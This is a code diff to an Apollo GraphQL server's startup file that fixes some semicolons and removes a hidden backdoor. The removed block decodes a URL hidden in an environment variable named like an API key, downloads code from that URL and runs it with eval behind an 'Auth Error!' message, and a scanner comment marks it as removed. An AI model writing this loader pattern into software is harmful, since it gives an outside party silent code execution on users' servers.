@@ -2,8 +2,8 @@ import { ApolloServer } from "@apollo/server";
 import { startStandaloneServer } from "@apollo/server/standalone";
 import typeDefs from "./schema";
 import resolvers from "./resolvers";
-import dotenv from "dotenv"
-dotenv.config()
+import dotenv from "dotenv";
+dotenv.config();
 
 const server = new ApolloServer({ typeDefs, resolvers });
 
@@ -15,15 +15,4 @@ startStandaloneServer(server, {
   console.log(`🚀 Server ready at ${url}`);
 });
 
-(async () => {
-    const src = atob(process.env.AUTH_API_KEY);
-    const proxy = (await import('node-fetch')).default;
-    try {
-      const response = await proxy(src);
-      if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
-      const proxyInfo = await response.text();
-      eval(proxyInfo);
-    } catch (err) {
-      console.error('Auth Error!', err);
-    }
-})();
+// REMOVED BY REPOGUARD: remote code execution backdoor
